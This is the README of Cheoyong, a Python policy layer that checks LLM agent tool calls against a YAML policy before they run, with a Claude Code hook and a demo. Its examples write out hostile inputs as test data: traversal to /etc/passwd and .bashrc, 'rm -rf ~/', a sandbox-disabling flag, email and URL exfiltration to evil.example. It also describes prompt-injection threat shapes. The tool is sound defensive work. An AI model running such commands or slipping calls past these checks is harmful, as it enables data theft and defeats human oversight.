# Cheoyong

A policy layer for LLM agent tool calls: allow, deny, rate-limit, escalate, and audit, decided before the tool runs. Formerly `agent-toolwall`.

[![CI](https://github.com/euisuh/cheoyong/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/euisuh/cheoyong/actions/workflows/ci.yml)

The name comes from Cheoyong (처용), a figure in Silla folklore whose mask hung on a doorway to keep plague spirits out.

## Problem

An agent loop takes a tool name and arguments chosen by a model and executes them. If the model was steered by injected text in a web page, email, or file, those arguments are attacker-influenced: an email to an outside address, a URL with a secret in the query string, a write outside the project, a purchase. Cheoyong sits between "the model chose this call" and "the call runs", and checks the concrete call against a policy file you wrote. It does not try to detect injection; it limits what an injected call can do.

## Install

Python 3.10+. Not published to PyPI; install from a clone:

```sh
pip install -e .            # library, cheoyong-demo, cheoyong-hook
pip install -e '.[dev]'     # plus pytest and ruff
python -m pytest -q
```

## Policy file

The bundled demo policy, `cheoyong/demo_policy.yaml`:

```yaml
version: 1
default: deny
audit:
  redact: [api_key, password]
tools:
  read_file:
    allow: true
    args:
      path: {type: str, required: true, matches: "^/workspace/"}
  http_get:
    allow: true
    rate_limit: {max: 5, per_seconds: 60, key: [session_id]}
    args:
      url: {type: str, required: true, allow_hosts: [".example.com", docs.python.org]}
  send_email:
    allow: true
    args:
      to: {type: str, required: true, allow_hosts: [example.com]}
      body: {type: str}
  submit_order:
    allow: true
    sensitive: true
  write_file:
    allow: true
    args:
      path: {type: str, required: true, matches: "^/workspace/"}
      content: {type: str}
  "*":
    args:
      "*": {denies: "CANARY-[0-9A-F]{4}"}
```

Checking calls against it:

```python
from cheoyong import Cheoyong

wall = Cheoyong.from_file("cheoyong/demo_policy.yaml")

for tool, args in [
    ("read_file", {"path": "/workspace/notes.md"}),
    ("read_file", {"path": "/workspace/../etc/passwd"}),
    ("send_email", {"to": "teammate@example.com", "body": "hi", "bcc": "x@evil.example"}),
    ("http_get", {"url": "http://evil.example\\@docs.python.org/"}),
    ("delete_repo", {"name": "cheoyong"}),
]:
    d = wall.check(tool, args, {"session_id": "s1"})
    print(f"{d.effect.value:5}  {d.policy:28}  {d.reason}")
```

```text
allow  tool_allowlist                tool 'read_file' is allowlisted
deny   arg_rules:read_file.path      matches violation for value '/workspace/../etc/passwd'
deny   arg_rules:send_email.bcc      unexpected argument violation for value 'bcc'
deny   arg_rules:http_get.url        allow_hosts violation for value 'http://evil.example\\@docs.python.org/'
deny   default                       default
```

Validate a file without running anything (exit 1 and a key path on error):

```text
$ python -m cheoyong.loader --validate cheoyong/demo_policy.yaml
arg_rules:*
tool_allowlist:read_file,http_get,send_email,submit_order,write_file
arg_rules:read_file,http_get,send_email,write_file
rate_limit:http_get
sensitive:submit_order
```

### Keys

| Key | Meaning |
|---|---|
| `default` | Required. `deny` or `allow` for calls no rule decides. |
| `tools.<name>.allow` | `true` adds the tool to the allowlist, `false` to the denylist. |
| `tools.<name>.sensitive` | Escalate: the `escalate` callback must return `True` or the call is denied. |
| `tools.<name>.rate_limit` | `{max, per_seconds, key}`; sliding window, keyed by `context` fields. In-process only. |
| `tools.<name>.args.<arg>` | Constraints: `required`, `type` (`str int float bool list dict`, exact type, so `True` is not an `int`), `max_len`, `enum`, `matches` (regex, every string must match, `..` denied), `denies` (regex, any string or key matching denies), `allow_hosts` (exact host, or `.suffix` for subdomains), `on_violation: redact` (for `denies`, replace the match instead of denying). |
| `tools.<name>.args."*"` | Constraint applied to every argument. An empty `"*": {}` turns off strict arguments for that tool. |
| `tools."*".args."*"` | Constraint applied to every argument of every tool. |

Unknown keys anywhere in the file are an error, so a typo such as `allw: true` cannot silently drop a rule.

## Decision flow

For each `check(tool, args, context)`:

1. Args are deep-copied. The tool name is NFKC-normalized and case-folded; argument keys likewise (plus Cyrillic `о` → `o`). Two keys that collide after normalization deny. Values must be JSON-shaped (`str int float bool None list dict` with string keys), at most 20 levels deep and 10,000 strings; otherwise deny.
2. Policies run in list order. A policy file builds them as: global `"*"` argument rules, allowlist, denylist, per-tool argument rules, rate limits, sensitive-tool escalation.
3. The first `deny` stops evaluation. An `allow` with rewritten args (redaction) passes the new args to later policies. Any exception raised by a policy is a deny.
4. If any policy escalated and nothing denied, the `escalate` callback decides. It must return exactly `True`; anything else, or an exception, is a deny. The default callback denies.
5. If no policy decided, `default` applies.
6. On `allow`, rate limits record the call. Denied calls do not consume rate-limit budget.
7. If `audit` is configured, one JSON Lines record is written per check, allowed or not, with `audit.redact` keys masked. Without `audit.path` records stay in memory (`wall.audit.records`).

Execute with `decision.args`, not the original dict, so redactions take effect. `wall.call(tool, args, fn)` does that and raises `ToolCallBlocked` on anything but `allow`.

Argument rules, in more detail:

- Rules run on the NFKC form, so fullwidth `ＳＥＣＲＥＴ` hits `denies: SECRET`. `denies` also checks the raw form.
- `matches`, `enum` and `allow_hosts` deny a value whose raw form differs from its NFKC form, because the tool receives the raw form. Fullwidth `／workspace/x` would otherwise pass `^/workspace/` and be a relative path.
- A tool that has argument rules accepts only arguments it names, compared by exact raw name. `bcc` on `send_email`, or `TO` / Cyrillic `tо` in place of `to`, deny as unexpected.
- `allow_hosts` extracts the host with `urlsplit` for URLs, or the part after `@` for addresses, then requires a plain LDH hostname after IDNA encoding. Commas and whitespace in a single-string value, backslashes in a URL, and characters such as `;`, `<`, `[` in the host deny. IPv6 literals are not supported and deny.

## Integration

### A tool-call loop

Sketch of the Anthropic Messages API loop. Not executed here, since it needs an API key; the `wall.check` part is the same code as above.

```python
from cheoyong import Cheoyong, Effect

wall = Cheoyong.from_file("policy.yaml")

for block in response.content:
    if block.type != "tool_use":
        continue
    decision = wall.check(block.name, block.input, {"session_id": session_id})
    if decision.effect is Effect.ALLOW:
        content, is_error = tools[block.name](**decision.args), False
    else:
        content, is_error = f"blocked by policy: {decision.reason}", True
    results.append({"type": "tool_result", "tool_use_id": block.id,
                    "content": str(content), "is_error": is_error})
```

The same applies to any loop that yields a tool name and an argument dict (OpenAI tool calls after `json.loads(arguments)`, an MCP server's `call_tool` handler).

### Claude Code PreToolUse hook

`cheoyong-hook --policy PATH` reads Claude Code's PreToolUse event JSON on stdin and checks `tool_name` / `tool_input`, with `session_id` and `cwd` as context.

| Outcome | Hook result |
|---|---|
| allow | exit 0, no output; Claude Code's own permission rules still apply |
| deny | exit 2, reason on stderr (shown to Claude) |
| sensitive tool | exit 0 with `permissionDecision: "ask"`, so Claude Code prompts you |
| allow that rewrote the input (redaction) | exit 2; exit codes cannot rewrite tool input |
| any error: bad JSON, missing policy, exception | exit 2 |

Errors exit 2, not 1, because Claude Code treats exit 1 as a non-blocking error and would run the tool.

[`examples/claude-code/policy.yaml`](examples/claude-code/policy.yaml) is a starting policy: reads anywhere except `.env`/`.ssh`/`.aws`/`id_rsa`, writes and edits only under one directory, `WebFetch` to a host list, a few `Bash` command patterns denied, `Task`/`Agent` routed to "ask", everything else (including all `mcp__*` tools) denied. Register it as in [`examples/claude-code/settings.json`](examples/claude-code/settings.json). Running it on sample events:

```text
$ echo '{"tool_name":"Bash","tool_input":{"command":"git status","description":"Show status"}}' | cheoyong-hook --policy examples/claude-code/policy.yaml
exit=0
$ echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf ~/"}}' | cheoyong-hook --policy examples/claude-code/policy.yaml
cheoyong: denied by arg_rules:bash.command: denies violation for value 'rm -rf ~/'
exit=2
$ echo '{"tool_name":"Bash","tool_input":{"command":"ls","dangerouslyDisableSandbox":true}}' | cheoyong-hook --policy examples/claude-code/policy.yaml
cheoyong: denied by arg_rules:bash.dangerouslydisablesandbox: unexpected argument violation for value 'dangerouslyDisableSandbox'
exit=2
$ echo '{"tool_name":"Write","tool_input":{"file_path":"/home/you/src/../.bashrc","content":"x"}}' | cheoyong-hook --policy examples/claude-code/policy.yaml
cheoyong: denied by arg_rules:write.file_path: matches violation for value '/home/you/src/../.bashrc'
exit=2
$ echo '{"tool_name":"mcp__gmail__send","tool_input":{}}' | cheoyong-hook --policy examples/claude-code/policy.yaml
cheoyong: denied by default: default
exit=2
$ echo '{"tool_name":"Task","tool_input":{"prompt":"x"}}' | cheoyong-hook --policy examples/claude-code/policy.yaml
{"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "ask", "permissionDecisionReason": "cheoyong: tool 'Task' requires approval"}}
exit=0
```

The `Bash` argument list in the example is strict, so a new field added by a future Claude Code version will be denied until you add it to the policy.

## Demo

`cheoyong-demo` runs scripted tool calls against in-memory mock tools, once without and once with the demo policy. No model is involved; it shows the policy's effect on five fixed misuse scenarios and one benign one, not resistance to prompt injection in general.

```text
scenario               goal                  unprotected   protected   blocked by
exfil_email            data exfiltration     LEAKED        BLOCKED     arg_rules:send_email.to
exfil_url              data exfiltration     LEAKED        BLOCKED     arg_rules:http_get.url
unauthorized_purchase  unauthorized action   ORDERED       BLOCKED     sensitive:submit_order
destructive_write      destructive action    WRITTEN       BLOCKED     arg_rules:write_file.path
exfil_flood            resource abuse        20 requests   5 requests  rate_limit:http_get
benign_control         (legitimate task)     OK            OK          - (allowed)

blocked 5/5 attacks, allowed 1/1 benign task. audit: outputs/demo-audit.jsonl (26 records)
```

The flood scenario still permits five requests; the rate limit bounds it, it does not stop it.

## Threat model

Trusted: the application that calls `check()`, the policy file, the `escalate` callback, and `context` values (rate-limit keys come from there).

Untrusted: the tool name and every argument, including keys, nesting, types, and Unicode. Cheoyong assumes these are chosen by an adversary who has read the policy file.

In scope, with tests (`tests/test_bypass.py`, `tests/test_normalize.py`, `tests/test_policies.py`):

- Tool-name case and Unicode variants hitting the intended rule.
- Argument-key confusables, case variants, and extra arguments smuggled past per-argument rules.
- Secrets hidden in nested values, nested keys, top-level keys, or non-JSON containers.
- Host spoofing in URLs and addresses: userinfo, comma or semicolon recipient lists, backslash parser differentials, subdomains.
- Path traversal with `..` under `matches`, and NFKC differences between what is checked and what is executed.
- Failure handling: malformed policy, policy exceptions, escalation errors, and oversized inputs deny.

## Non-goals

- Not a content filter. It never sees prompts, completions, or tool results.
- Not a sandbox. It governs only calls routed through `check()`, `call()`, or the hook. A tool that reaches the network or filesystem by another path is not covered.
- Not an injection detector. It constrains the consequences once the model has chosen concrete arguments.
- Not a shell parser. `denies` on a `Bash` command is a regex over a string; `rm -r -f`, variables, `eval`, or base64 get past any pattern list. Use it to catch mistakes, not to contain a hostile agent with a shell.

## Limitations

- `matches` uses `re.search`. Anchor with `^`; prefer `\Z` over `$`, since `$` also matches before a trailing newline.
- `matches` denies `..` but does not resolve symlinks, and paths are compared as strings. `/workspace/link-to-etc/passwd` passes `^/workspace/`.
- `allow_hosts` checks the host only. Scheme, port, path, and query are not restricted; a canary in the query needs a `denies` rule.
- Rate limits live in process memory. In the Claude Code hook each call is a new process, so `rate_limit` has no effect there.
- `on_violation: redact` cannot be used through the hook (the call is blocked instead).
- Harm that fits inside allowed tools and arguments is still possible: a permitted email can still be misleading.
- Anyone who can edit the policy file can disable it.

## Relationship to gumiho

[`gumiho`](https://github.com/euisuh/gumiho) measures whether indirect prompt injection persuades models and how mitigations change attack success. This repository is the enforcement side: given a concrete tool call, decide before the side effect. The demo mirrors gumiho's threat shapes without importing its code or claiming susceptibility rates.
